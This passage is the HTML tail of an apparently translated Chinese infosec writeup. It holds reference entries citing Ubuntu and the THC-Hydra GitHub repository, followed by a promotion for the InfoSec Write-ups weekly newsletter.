jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Ubuntu(未注明日期)。<em class="ne">企业开源和Linux </em>。2022年8月8日检索自:<a class="ae kp" href="https://ubuntu.com/" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/</a></p><p id="e3ae" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“范·豪泽”(未注明)。<em class="ne">九头蛇</em>。GitHub仓库。2022年8月8日检索自:<a class="ae kp" href="https://github.com/vanhauser-thc/thc-hydra" rel="noopener ugc nofollow" target="_blank">https://github.com/vanhauser-thc/thc-hydra</a></p></div><div class="ab cl ok ol hy om" role="separator"><span class="on bw bk oo op oq"/><span class="on bw bk oo op oq"/><span class="on bw bk oo op"/></div><div class="in io ip iq ir"><h2 id="2fe0" class="mn lh iu bd li mo mp dn lm mq mr dp lq kc ms mt lu kg mu mv ly kk mw mx mc my bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae kp" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>